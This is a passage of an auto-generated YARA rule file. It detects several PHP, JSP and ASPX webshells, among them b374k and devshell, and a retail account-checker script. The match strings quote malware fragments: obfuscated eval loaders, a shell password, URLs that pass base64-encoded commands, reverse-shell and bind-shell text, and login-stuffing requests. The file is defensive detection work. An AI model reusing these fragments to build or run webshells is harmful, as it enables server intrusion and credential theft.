      $s17 = "$proxy_shit=\"H4sIALMXx0QAA+RafXhU1Zm/M5mBAUJmUD4i2hKsKFSBhC9RRFN1FK1bRpSK1jXEfHCD+Spzp0AfkLjDrIzD2NiK0qe1Gx+0i61d6YqCrdEgSIJGn6" ascii
      $s18 = "                    <OPTION VALUE=\"sed -i -e 's/<html>/<div style=\\'position\\:absolute\\;width\\:2000px\\;height\\:2000px\\;b" ascii
      $s19 = "m/scripts/contact.dll?msgto=656555\\\"><img src=\\\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\\\" border=0 align=ab" ascii
      $s20 = "     echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" na" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule D_____ASPX_ {
   meta:
      description = "webshell - file D -  [ASPX].aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "790d10d4733a6a98d3b7de3b11641e2d3426ef4c0e443d7b07ca1eb156c8a457"
   strings:
      $s1 = "            TimeSpan usetime = System.DateTime.Now - start;" fullword ascii
      $s2 = "         <div>Code By <a href =\"http://www.hkmjj.com\">Www.hkmjj.Com</a></div>" fullword ascii
      $s3 = "         start<asp:TextBox ID=\"Fport_TextBox\" runat=\"server\" Text=\"c:\\\" Width=\"60px\"></asp:TextBox>&nbsp;&nbsp; " fullword ascii
      $s4 = "        System.DateTime start = DateTime.Now;" fullword ascii
      $s5 = "             }" fullword ascii /* reversed goodware string '}             ' */
      $s6 = "             {" fullword ascii /* reversed goodware string '{             ' */
      $s7 = "                 {" fullword ascii /* reversed goodware string '{                 ' */
      $s8 = "    </script>" fullword ascii
      $s9 = "    <script runat=\"server\">" fullword ascii
      $s10 = "<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>" fullword ascii
      $s11 = "                DirectoryInfo[] subdirs = cdir.GetDirectories();" fullword ascii
      $s12 = "            ScanRights(new DirectoryInfo(Fport_TextBox.Text));" fullword ascii
      $s13 = "            this.Lb_msg.Text +=\"usetime: \"+ usetime.TotalSeconds.ToString();" fullword ascii
      $s14 = "        <asp:Button ID=\"Button\" runat=\"server\" OnClick=\"ClearAllThread_Click\" Text=\"ScanWriterable\" /><br />" fullword ascii
      $s15 = "                File.Create(cdir.FullName + \"\\\\test\").Close();" fullword ascii
      $s16 = "                    File.Delete(cdir.FullName + \"\\\\test\");" fullword ascii
      $s17 = "    <form id=\"form1\" runat=\"server\">" fullword ascii
      $s18 = "<%@ Import Namespace=\"System.Text\" %>" fullword ascii /* Goodware String - occured 3 times */
      $s19 = "         Stopat <asp:TextBox ID=\"TextBox_stopat\" runat=\"server\" Text=\"5\" Width=\"60px\"></asp:TextBox>files" fullword ascii
      $s20 = "        protected void ClearAllThread_Click(object sender, EventArgs e)" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 6KB and
      8 of them
}

rule b374k_2_8_source {
   meta:
      description = "webshell - file b374k-2.8.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
   strings:
      $s1 = "$s_css = \"rP1nr+RQv92JvReg7/DgzgCSwBGY072WxwzFnFmMhiEw5xyL/vJm9yNpBNgYA4ZZ6GoeHnKTe+//Xmv9+nRX/1/+97me//2/q4skL9b/+C/cNO7FuP/n7" ascii
      $s2 = "// https://github.com/ded/domready - domready (c) Dustin Diaz" fullword ascii
      $s3 = "else echo \"- shell command -\";" fullword ascii
      $s4 = "// encryption for shell password" fullword ascii
      $s5 = "http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&cmd=dW5hbWUgLWE=" fullword ascii
      $s6 = "Poq99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2" ascii
      $s7 = "if(trim($s_res)=='') $s_result = notif(\"Error getting process list\");" fullword ascii
      $s8 = "setcookie(\"b374k_included\", \"0\" ,time() - $s_login_time);" fullword ascii
      $s9 = "if(!in_array($s_k, $persist)) if(!is_array($s_k)) setcookie($s_k,\"\",time() - $s_login_time);" fullword ascii
      $s10 = "setcookie(\"massact\", \"\" ,time() - $s_login_time);" fullword ascii
      $s11 = "setcookie(\"buffer\", \"\" ,time() - $s_login_time);" fullword ascii
      $s12 = "setcookie(\"c[\".$k.\"]\", \"\" ,time() - $s_login_time);" fullword ascii
      $s13 = "='rshost_\".$s_rstype.\"' value='\".hss($s_rstarget).\"' /></td></tr>" fullword ascii
      $s14 = "elseif($s_split[0]==\"back\") $s_rstarget_packed = $s_rsport_.\" \".$s_rshost_;" fullword ascii
      $s15 = "http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&eval=cGhwaW5mbygpOw==" fullword ascii
      $s16 = "// give the code/command you want to execute in base64 format" fullword ascii
      $s17 = "$s_rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $s18 = "$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());" fullword ascii
      $s19 = "$s_dump_tbl_link = $s_self.\"x=db&connect=&sqlhost=\".pl($s_sql['host']).\"&sqlport=\".pl($s_sql['port']).\"&sqluser=\".pl($s_sq" ascii
      $s20 = "$s_rsbind[\"bind_win\"] = \"Bind Shell <span class='desc' style='font-size:12px;'>- windows executable</span>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      8 of them
}

rule devshell {
   meta:
      description = "webshell - file devshell.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0e7176e1e40aa5f059ba14236f42d79af672ab1a097aa8a3a07092b055fb5571"
   strings:
      $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(cwd));" fullword ascii
      $s2 = "target.style.background = '\" + shell_color + \"';\" +" fullword ascii
      $s3 = "Process p = Runtime.getRuntime().exec(finals);" fullword ascii
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */
      $s5 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s7 = "String shell_password = \"devilzc0der\";" fullword ascii
      $s8 = "Hashtable ht = myParser.processData(request.getInputStream(), bound, xCwd, clength);" fullword ascii
      $s9 = "\"<td style=\\\"width:10%;\\\"><input type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnCommand\\\" style=\\\"width:120px;\\\" v" ascii
      $s10 = "buff.append(\"<td style=\\\"text-align:center;\\\"><a href=\\\"\" + view + \"\\\">Edit</a> | <a href=\\\"?get=\" + f + \"\\\">Do" ascii
      $s11 = "background:\" + shell_color + \";\" +" fullword ascii
      $s12 = "\"<td style=\\\"width:10%;\\\"><input type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnCommand\\\" style=\\\"width:120px;\\\" v" ascii
      $s13 = "String shell_fake_name = \"Server Logging System\";" fullword ascii
      $s14 = "buff.append(\"<td style=\\\"text-align:center;\\\"><a href=\\\"\" + view + \"\\\">Edit</a> | <a href=\\\"?get=\" + f + \"\\\">Do" ascii
      $s15 = "color:\" + shell_color + \";\" +" fullword ascii
      $s16 = "html_head = \"<title>\" + html_title + \"</title>\" + shell_style;" fullword ascii
      $s17 = "\"<div style=\\\"font-size:10px;\\\">\" + shell_fake_name + \"</div>\" +" fullword ascii
      $s18 = "response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\" + myfile__.getName() + \"\\\"\");" fullword ascii
      $s19 = "dWFsQWxsb2MAAFZpcnR1YWxGcmVlAAAARXhpdFByb2Nlc3MAAABPcGVuU2VydmljZUEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string 'ualAlloc  VirtualFree   ExitProcess   OpenServiceA                                              ' */
      $s20 = "String wBind = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyB" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule b374k_2_8 {
   meta:
      description = "webshell - file b374k-2.8.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bd2190cabf86a53743bf2d0d8fb77476ca7d4c08b6cfcd1e3dad05b434226676"
   strings:
      $x1 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$b374k=@$s_func('$x,$y','ev'.'al'.'(\"\\$s_pass=\\\"$y\\\";?>\".gz'.'inf'.'late'" ascii
      $s2 = "$s_pass = \"fb621f5060b9f65acf8eb4232e3024140dea2b34\";  // default password : b374k (login and change to new password)" fullword ascii
      $s3 = "lJHbL5B8vcKjCniQDL0D0Z6jZhWXa/4LsXgqVTRCys0EyE43yu6phMo5J8PVQMpng2QmIK+SkedkBJFFK+xTtR1Q982HcMljDTA7LI2rf2tTal1gz7Ji4K4qrRZQTqQH" ascii
      $s4 = "VVQtJv/YrXmO3aGEtm8R7kmys+HflAGZWQMCKWkuPbgs5BphTLGXTL/H1XvcDvWBH9AlpMpFTOl+HmPbo6Rp7FphE8ux7H7J1kthJckP8VdtsgTqjzmvkEORJZS2FGew" ascii
      $s5 = "3h8eWDs1dpXQcvuNRq7B/5WbWqufzZ7ChaTD0dHR7dn7dr6PlmWwdp0c//2wP+86TRMvzGzdBQs9DeHjc87h9NLtdnq2vb2rjlxNbG+BF7rLw8Pps8mdqZPJi7uHs+7R" ascii
      $s6 = "3DnZBNychHRLo+Db5iJb/gifBnb5LUJ08kbrxw+wmsCi4D3W31yBIVv3wjQHh16Iya3lAtPcIZx5y9nQUuDCmtVGVTt+V7RBSv6BEtRPEobCwBdc892IbEYev3uTeANQ" ascii
      $s7 = "vwiG6Ff1MkK6gcuric6oaTEezkRKykt0J7KLQC6WMfuxXUSlcgEtSSeQTl5C3i4rhJ9sufyDofdIMNZpgDI34JeIn9vkBYjtcnUICb6lSzf8yLgb6HM2SzngezphNfXC" ascii
      $s8 = "EAp/hIUdARk8ebKS9mPa/L19RjtC91oP5wNIaL3jUu0ef9uWemL1+C3WW4Bd/KVlyZ75MLkBQm1PhBVtHEc441qCNzBhk0LuczXruoeGhidPUVNWT4aNh+sBoRsh8C7g" ascii
      $s9 = "7+kX+FIDOzYg/2FP99ki+We9nFi8zLYb3jle2JH0zkLM9e9sqGKxLbuFkqv/lTTr5EI4A+mekBGGmlOGjJNTnJTEGKgdoxL7xOcH/eSCreQIij/hi66DwmXfW0IEcnia" ascii
      $s10 = "Cof8KZnPa7oyjmdrkc8pruxYig51ZShM2ZGU+BKyh/0HasIzIEOE4XG7ngoMcll20GblaVZcllaGembMp0C/C18JwNOiY91s208GoWV9x+qkIiTQyHx4ul1QSbM4iMJL" ascii
      $s11 = "j2ig+39rK0beuwGiKF5YvMZ1uOIaLABQQB6dbpA4Td7nldi6r1BbtaN93oY8D+up8pqkjafpr7Lk2GNRMV64C3ZWYTJMNrZrAaq2jwEnzgdRcZh+Mf/FZRnbiRcpjceY" ascii
      $s12 = "Y+xOF6YgbgikYoj2+qJtQwLW76lJWixgKOGyI1pTqxzbwsWlI2iqnY3EwcvyHntSp0cgacZGl797QG++Q9vfu9m4+xGwaHhM/QZNLRh1BlnSvVoDe0bf9X0vRg+fkUCC" ascii
      $s13 = "NWYfBwhjGTk2g+VG4Dw+gKOkFj8UJszAPLzNcoyq4lWR1BfVpnh7xeoohOARpv1PbdkoqYrJuKM6gqRcEQLYy8fDim5fiRc6SLCxzqhdrndOGloQ/Z4sXBeGH9RqU3R7" ascii
      $s14 = "0ImDddp996bZDUR5l+QJhiMqSMLbakBMTCvR4TcmJe7OKzxkpfYrFuKDXjrdWA3PxKAUmb6gsm4QHEAdW/nYFdfTjSFY+BYpAtO5NxNEZIfbf4PcCv6u5bTS6YVViARH" ascii
      $s15 = "xUsEtJeoaZtqQgQWtMK2l9iVX3uIjkjcYFdgoy0h/AOqqvNQohDQgYElDWs17Il3w7+KTTicgp+UySpYR8++/L6djQ4BH4cPi06QF6Ri0GLIfiBkmmXtAODHa9u3xF1P" ascii
      $s16 = "dUQ4jFsGRg1JhOBfX5tnuRHDk38ODCkhcZbmovCymkPjdNJlz7lvAj6gQljXwqvl3eyGJ7lYGvDfTP34301pKZfR92ViRcmKo6Wdz1WMPG1yYiPJUwxKVFfiSBYGwOzG" ascii
      $s17 = "VdPv+SX6ZgAb7npF30OrTqzYWjSZ3KZQuHbENcE9XAnpypr6U2mbMGWU0ZICphdSFa9rEDQCR5lSX5xjW1HMut4C3NG0kcz/5/KDktZl+WqcjH81t4A8QCuSfeT6FtPF" ascii
      $s18 = "HRjaLte/EhoGetrzFvOm2Mu7i34+y1zBf/ZsAi+TpmAuNxwnzTs5YIJjjQte1WrArhAXnUHsYxXrZi6jDXw0lW9fgZsS9hzxPTE5rhQ82os4XjTkNko7qlTqUDofjhlH" ascii
      $s19 = "3tLzblpe+HCC5fsvWZ76suMYy/WrP3Nu9PL7kH/4vxrrdptzPj9TdNtdIbr2/5i7erxcdvebK2d7UaX7rG7Pz8029b2+f7cmbF1dtfofG4Mp5ubV83Z+cMd+9S6HGxNt" ascii
      $s20 = "AY+VB3o8Qq0QL+xFKn26PUDEaBAaZNeIpzIECddbfJBm/THgETR8UchzNu6sYNAetwaNsGdUZ19G+Zdwi4TC3zT4S8Y26IYvwaVTju2675MgqcPIbnULpok0MnfGPqJD" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule b374k_3_2_3_min {
   meta:
      description = "webshell - file b374k-3.2.3.min.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bc3b1b3d51e1202e00b06426a65942adb3628658de5f3808026bd2970b651152"
   strings:
      $x1 = "$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$b374k=$func('$x','ev'.'al'.'(\"?>\".gz'.'un'.'com'.'pre'.'ss(ba'.'se'.'64'.'_de'." ascii
      $s2 = "NRYjW8EzmdhqYfwwkOjdqC05lV1vn6lOGKb4ITY20mQbPRTkLH4399Zh7d2t7LWXRjSeckMhsJCuaRunXLJFrwnMBemUY4j1xI/h0zCdXyhnr4lllkEXw5j0x6/6GZdF" ascii
      $s3 = "R94vOdulRk/vYtIHzjbuummcL2S6Wq3DaiuzVtbd27TKTj8p/bxmRxqruN6q4VbZWPGlKqPhJFKVP1kahNm6qPxKEyqfMr8Wzx1JOWWDibWt9Jdcuk1YTEj+2pPzmx1y" ascii
      $s4 = "https://github.com/b374k/b374k" fullword ascii
      $s5 = "r/2Fm3gO4wPvyq7xfNR/7cg/nQaie715s48+tGSZE/WLFeZHdXmRmY+vNTbu5yNTXV87NW5ECyx6evv8VFHriRCQhF5uN3Jw8DMCI29l9/q1wjdx5aCPL/PP7mHFc7Pu" ascii
      $s6 = "rLbd5hMUtE4h2M9uAfRfc/R4uDEd/Xy5Px5YxuaZ8MMPxFzLEl5sVC61MtZcWBvG+pDCHF2EgPy3k5xuofY5oftnW0l5Kc0yx6X5BoOckOO25kEibOIAfT87IRC8/lO5" ascii
      $s7 = "RzPzLnRvlIV8obtkEqDAuIeIyEPqutXx1bxLouxd/MarRrsRr0BhKipSiYHihEJt7WmRCkJDNsciqjym0aBrmcosPYyUNfkMbUBHNLThzOFlkTzYLi4Zd4Pbg6LxfwY1" ascii
      $s8 = "HMisZ2kZxSTm1sIL3w2NjDDIv1kxxoe3VwXQ9G6kxnF2kwdvCLSyjHAxpcFTp9HoFqjcEj/ROK2kARs7+lSbkcXRYvy2f5IsfDT0VhifpvIdSdIHlE9gMJZ2RoxohVTj" ascii
      $s9 = "7VoK8qULnuVkqP7BIJzugEtqtmO4SecnS/nJOj+WDsSv4g8mdDqesPnD7p6FUv5qgOtTAnNkMYzJyNHBIS8c6QW05UjJ3Z+lChQC0oMCZbifi8OiwBwCKZPctbq1wm8f" ascii
      $s10 = "leqa/mH0AV+CNyOk0xKzCSnP7i3+mLx7TfTJZokXvxq/Jc1jU/xciSzkkASJJ5ieWOD5QkL2RBkA/wi1aZFb/nXGX3PHeADE+UPvCsvnphuT3PcI/oxwMFWE/naeFRY2" ascii
      $s11 = "s1IEFXHRDU4Edkfu8EfxumpTag75RM8RZB9Ihjn2/u66OBCzRJUQ2aBH0g+bsXyf8ZaIKu+rjuuYNmcQxBjx16HIaN1M6IgetxBAfYjNTStZuDt68/oPYmxH9o1TGyQZ" ascii
      $s12 = "QYgu4Agun+jgc/wiCZp75S0EYExwMhDDxGYHIwCOk5kkXWRpE19RXwGg+/ABQEgryHCn+7W/9xhVpY/xO0WNLmlhpsvea06qeg5+UjLP7i9z0RfX8Em3D/qyPJqIT/A+" ascii
      $s13 = "H9Pb9rTsOtrNbfioWukAbVlKAKd7fFjlqGgJYhWGeT5s4iIdrszh4f4r3DzDyAFfVJDbBiSormp24yWqcrtHGyBIGCJND2d1zMvreUZ52sPa8F8JLQGdDoDV6gqF+KhV" ascii
      $s14 = "2qdkYo5nbxTrhmgDSLYDUQNASH5NdoCEji7JtFpN161FkG93InIsvmeDPGwKIaSuHNhiUpFkVjeHpxdtptjc6SgNlEbfw57gRPHkwB6QS68ckU8ITLVFtP4j2rPhF7YR" ascii
      $s15 = "g/JqLNtOR38H5HzGsPa2QYsk5HaxrpfQvBPf2MSIe5kXKLErVcv0HuPz7zFZgb00b6C7hQA+XJb+ZDyHy7cREDan32r0Dn8EZRGA2uc+NYIo5zLwIAQFuw/jMYH+1Kk1" ascii
      $s16 = "B2fWT08XO/36+0mtEzw+skB6hM5XTRCtmdqgAnV2YW4uU0UnbTKFslN5fWpsX2WldRdr+0XpO3dqPfEvN6k67RWdDllTkhWmEhyNqszZWjF4ClJVgJPJCKxwXITlHm9f" ascii
      $s17 = "shUTgvVrtWMheS5NSuMZ8VutxqH553qo3sujDaBFklxHbYzFSJRtfhUzk+zfSijWC60tlOGZqVz7PyqklPNmKNCcV3XDSakPfDbT+plBl53FZX9Q2jdduFPKPtd4f4TM" ascii
      $s18 = "tBP3MB7g8M6gLoGOQAbiOXZjZ6nbgKJbndgjXsdCuSgCUOnvbPsquk2NsrBAl6NhImXcx/y/q2XqtfGcQOIko9GT1QsANiAgiLHhSykghz0h6rhWzUAXmyngi44wNAdq" ascii
      $s19 = "FdTvNB8eP3NKUEZ4OKw6md+ZNksjfJt/li2CJPFJC9KSlOxLnEyeK0eAXMe26L+Ej9cHEq6Hf0SMko6hR4UTcYK1CQpXu2wqIv1klR3bCZYy/WO/2czTcv6jIwS53fkr" ascii
      $s20 = "OBov0C603DoZsNRdQ6uAYARTit1r/NepJ0O4646nHjmRJzWp4u2ZKxV7g/GdMjRrImo8oTe1NtPSF1etujqYqlU44+oPOsTqZOWLZcVtvYjE8XiZqtC3c2dOjClLjNbE" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule b374k_3_2_2_min {
   meta:
      description = "webshell - file b374k-3.2.2.min.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0497d0a609565a8737af2eebe28e7909e91c9e693b911f8abe206b8975657b9a"
   strings:
      $x1 = "$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$b374k=$func('$x','ev'.'al'.'(\"?>\".gz'.'un'.'com'.'pre'.'ss(ba'.'se'.'64'.'_de'." ascii
      $s2 = "lj/Mm3CY+nXuDjDtCWLACpJsR565FVY+gzXjTO/ZiN161QDProj7Y33U4b29pG/9dVuFx1duwtxxIgIbDLlaEWIRCIHimVt4b6vu+AJN+1nyUBNk7s2vv9xjnOCJJWO9" ascii
      $s3 = "6uaRXOu6I6WHuLJO4EyJRoTQ6aOmkjIGer5DTslcNsu+jMBqrXOyC94SE9pPo+MORs7MLbQ4mH3U3RBnFwU/bmFcRwwYRIAEJEkwPLMpsImS32K6bt09FMtMPKq6S1U8" ascii
      $s4 = "https://github.com/b374k/b374k" fullword ascii
      $s5 = "z6IQZdyPtZRI3be8XbZu9uY9Q/4JfX8miC9H2Wp1Htxk5bnV1Ec8KTFdWKg5ws6TcKoSkWAxMrgEyep3Wbn/o8J8ZdYMX2pV9tIy+0H8/xwxnf91dvxYk3NOzss1Q/0r" ascii
      $s6 = "pGCkXgWHYO33bW5aS4GpWUy5/ni8k5ohocOwaTD+cwWOgPEOmc7mmBE8Lsz+n9SEXfz3nyUuxqimfXczaugrTdSJFjmFzIRcPEDrvn2O1ZgMRtZaBq2fUElX4DYDZtfM" ascii
      $s7 = "cpB84T8kIO/H3ldowJSlzEqX4M/akLOGYh59M00OPaqRBBOEv/QY7K1/yUISS0piDMDmMfmXPvuqZ7fXaQOwGEQZeXS8BpuCIUDUVF2wHL+d8xW9JotvQRGAV7z1je7R" ascii
      $s8 = "jK7o+vIQvua8gsGlJeP+zFPa1SLKCdlZmdCMo9U+zTQeV17v67D5EC/7+QVZESOX0lsy9+RdZAQYs+XlJ2JnrYJQdZZf0Uz+JffkqiRc78NjpmIUv6o8afuS+RmHJ8Pv" ascii
      $s9 = "u9yi0aBtmcosPYzkOPF8fUAHNTSmzWEn4GmgXFwy3xerB1Xi7gx7jcPYAP5rd9K5tl5ep4adPy9Ba+EAj4DudsIQNDt9WSnAg8b4AtBev/eeMADfM+DPPp6PUowmi2vU" ascii
      $s10 = "x8KLA12v+/PxTTu6OdLDGys7NA25mxvmqg+RYkcEC0fhVitRo9XlQf4kHYAks/9H2hmeNmi0MNJr2QlYsbzy9YsAZneS9G3+ojb7QBm2HbQ9RjCDTLFTp0ingpeIhoHx" ascii
      $s11 = "6Ga8UfOPBEo5q8VQApzdFvhoStuCW2c0AxLpRJDA6+v7fXh4npA10B5JgdXaJfkX4se1czPF+yzJb2E8SOr4czYF4X0HcE0uswlqH1E2CCSg4q6y4xZJMxh1l1YbEGAO" ascii
      $s12 = "TsC5ELPtcW8IZwTsGt7kXfPsiRcNX/+g8ifkuWR4ouw+a7ygRWB5DrvwFaVy3sv3N352VPaOz8eERlL8/3R7T7GgPWnb6iGv7XS3ZcPRvaT5u/rfCvEEMjTj/KflC+Mw" ascii
      $s13 = "Or3Pp8sog5G8GRsxXn35zVZJjnYq016JfVaI5iSMZrtZwy/J9Ff5iRCcNWLyduPrW3RABeUTITuW4IrCgYuS+GSJahK0xmW40rK2jiyIiClIVNFXU0wjqed5gvOvdH2Q" ascii
      $s14 = "bVlKAKd7fFjlqGgJYhWGeT5s4iIdrszh6fhL3HzDyAFfVJDbBiSormp24yWqcrtHGyBIGCJND2d1zMvreUB4asPa8F8AmhM6DRO7xAUb8UC7FqrJP22NqzRk9QUT2Yhq" ascii
      $s15 = "Re35E6gceaY5VFdCL2BCRppUWXgr2i001eJlFMSbVTBM0ap0pObKpyD41c32JzL+zQvoW9bYStsBnY4VKe703khaDDlLoJaHV+6GXYWVtPvDPmwCxiHqp4AokVJaRMK+" ascii
      $s16 = "eK8LVAXyvAUVY3tz9p9lkaF1p0c2674NIzEmwE879zPEePcynQml7b0d9dR8uyF5u4O1rEbY3JLcs33gL3bxrtWWubwzzeHBMA/fXizwb3oN6Cvton3AB9u6+pO2KZOD" ascii
      $s17 = "lhrFylC4UEeG76DFPwrObzrL1S2azeAgWPGrlogcexOZp0Wq5S/4AbqiJu0WGSuGfJ4MyD8sMssHjUtBLxhPeHUNi3kxOSo5wyfS+oNi5bY63dOgOmC4u5D6dsCe3u0l" ascii
      $s18 = "AtRyyf/uDGzaM1X6/FtTCeT7HeoTNirW0E6zHagkBobrFKfptrXxv/+eYSxx3rmour/H1tFTpxcQ3F7vlsIinEwRFo5viDAapCCuRKQLEyxiq9OhlrYz/5Iq6CSIbUIN" ascii
      $s19 = "I0QxCkm3EKXRO+ELoGw0NXITXpeOSHFG+evTMYMXVUxnTukVSItKYZOx/rqe6e//qaCs6Sus3iWqHCsIxfvne/vJ+XXmbA41d09Arhfz9YjbvW92O7uzwGtdvyww20ET" ascii
      $s20 = "dZCRVCK8vNgeQqQhsLkI4FsnhRFCcUjS6qOcSjnOYYnMCISH9pa1YfCyCFHpiOG/tLO15j2Jzxd5SPYulyb0pbbDzblqsITd2RbWGLCkJZROmM5WVbKXu+yOP70lgJI9" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule gamestopceker {
   meta:
      description = "webshell - file gamestopceker.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d256ba0f2db9560bd91ac63241e32572169a61867e7c29d1b43a1c93f65942e2"
   strings:
      $s1 = "        $post = \"__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=$VIEWSTATE&ctl00%24ctl00%24BaseContentPlaceHolder%24c" ascii
      $s2 = "        $url = \"https://www.gamestop.com/Profiles/Login.aspx?ReturnUrl=/\"; " fullword ascii
      $s3 = "    { $BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/p" ascii
      $s4 = "    { $BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/p" ascii
      $s5 = "Login%24CreateAccountHorizontal%24ComfirmEmailTextBox=&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24Context" ascii
      $s6 = "%24ContextSiteLogin%24LogIn%24loginControl%24password=$pass&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24Co" ascii
      $s7 = "tSiteLogin%24CreateAccountHorizontal%24chkEmailOptIn=on&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24Contex" ascii
      $s8 = "older%24ContextSiteLogin%24LogIn%24loginControl%24UserName=$mail&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder" ascii
      $s9 = "SiteLogin%24CreateAccountHorizontal%24PasswordText=&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSit" ascii
      $s10 = "xtSiteLogin%24LogIn%24loginControl%24loginButton.y=16&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextS" ascii
      $s11 = "eLogin%24CreateAccountHorizontal%24ConfirmPasswordText=&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24Contex" ascii
      $s12 = "ntextSiteLogin%24LogIn%24loginControl%24loginButton.x=43&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24Conte" ascii
      $s13 = "iteLogin%24CreateAccountHorizontal%24emailTextBox=&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSite" ascii
      $s14 = "plan&email=$mail&password=$pass&sock=$sock_use','result_$id');</script>\", $s); " fullword ascii
      $s15 = "    $cookie = tempnam('cookie','ccv'.rand(1000000,9999999).'likeguitar.txt');  " fullword ascii
      $s16 = "            $url = \"https://www.walmart.com/cservice/ab_index.do\"; " fullword ascii
      $s17 = "        $url = \"https://www.walmart.com/cservice/ya_index.gsp\"; " fullword ascii
      $s18 = "tSiteLogin%24CreateAccountHorizontal%24SlideToCreate=\"; " fullword ascii
      $s19 = "    @import \"http://fonts.googleapis.com/css?family=Play:400,700\"; " fullword ascii
      $s20 = "            $url = \"https://www.walmart.com/cservice/ph_order.do\"; " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule webshell_php_gfs_sh {
   meta:
      description = "webshell - file gfs_sh.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c8df75173ff2c9fae9980b311fbf23740b47481aec2175218d7ea99db5c31770"
   strings:
      $s1 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii
      $s2 = "  die(\"<b>Error dump!</b><br> table=\".$_POST['tablename'].\"<br> db=\".$_POST['dbname'].\"<br> host=\".$_POST['host'].\"<br> u" ascii
      $s3 = "  die(\"<b>Error dump!</b><br> table=\".$_POST['tablename'].\"<br> db=\".$_POST['dbname'].\"<br> host=\".$_POST['host'].\"<br> u" ascii
      $s4 = "  $res=run_sql(\"SELECT * INTO OUTFILE '\".addslashes($_POST['dfilename']).\"' FROM \".$_POST['tablename'], $_POST['dbname'],$_P" ascii
      $s5 = "$port[4000] = \"icq, command-n-conquer and shell nfm\";" fullword ascii
